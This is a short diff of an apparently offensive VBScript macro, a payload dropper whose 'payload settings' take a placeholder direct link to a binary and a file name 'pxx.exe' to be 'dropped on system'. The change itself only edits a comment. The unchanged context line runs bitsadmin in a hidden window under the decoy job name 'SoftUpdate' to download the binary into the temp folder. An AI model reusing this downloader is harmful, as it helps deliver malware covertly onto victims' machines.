@@ -3,7 +3,7 @@ Sub Main()
 
 	'Userdefined payload settings
 	URL = "XX" '<- You binary direct link
-	SAVE_NAME = "pxx.exe" '<-- The what file should be named when dropped on system
+	SAVE_NAME = "pxx.exe" '<-- what file should be named when dropped on system
 	
 	'Download File
 	CreateObject("WScript.Shell").run("cmd /c bitsadmin /transfer SoftUpdate /download /priority FOREGROUND " + URL + " %temp%/" + SAVE_NAME + ""),0,true
